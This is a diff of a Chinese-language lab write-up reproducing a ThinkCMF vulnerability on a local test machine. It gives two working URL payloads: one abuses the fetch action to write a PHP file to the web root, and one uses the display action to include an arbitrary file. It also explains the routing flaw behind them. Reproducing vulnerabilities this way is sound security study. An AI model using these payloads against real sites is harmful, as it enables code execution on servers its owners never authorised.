@@ -16,22 +16,26 @@ linux下：
 apache+php->
 nginx+php->
 
+0x02  
 搭建环境时，第三步报错，提示“thinkcmf 安装报错 Driver.class.php 　LINE: 350”，drop database thinkcmf后，重新安装成功，原因未知
 
+0x03  
 由于我个人喜欢在不同的虚拟机下进行攻击测试（这样更贴近实战），当在虚拟机kali下访问时无反映，提示“just a demo for multi lang user! LANG IS en-us;”，后经测试发现是因为thinkcmf不能在英文系统下访问，改用虚拟机win10攻击机（中文版）访问，成功访问
 
+0x04  
 使用firefox下插件HackBar Quantum，执行payload1  
 ```
 ?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo(); ?>')</php>
 ```
 成功在C:\phpstudy_pro\WWW\ThinkCMFX\下创建test.php，访问http://172.16.35.132/ThinkCMFX/test.php 能够成功访问
 
+0x05  
 使用firefox下插件HackBar Quantum，执行payload2  
 ```
 ?a=display&templateFile=README.md
 ```
 成功包含了README.md
 
-0x02  
+0x06  
 漏洞形成的根本原因，ThinkPHP框架规则中，可以通过g\m\a参数指定分组\模块\方法（这里的分组即应用，也就是可以通过g\m\a参数指定任意应用的模块、方法）  
 应用是thinkcmf中的概念，一个blog即一个应用，一个商场即一个应用，具体参见thinkcmf官方文档：https://www.thinkcmf.com/docs/cmfx/app.html
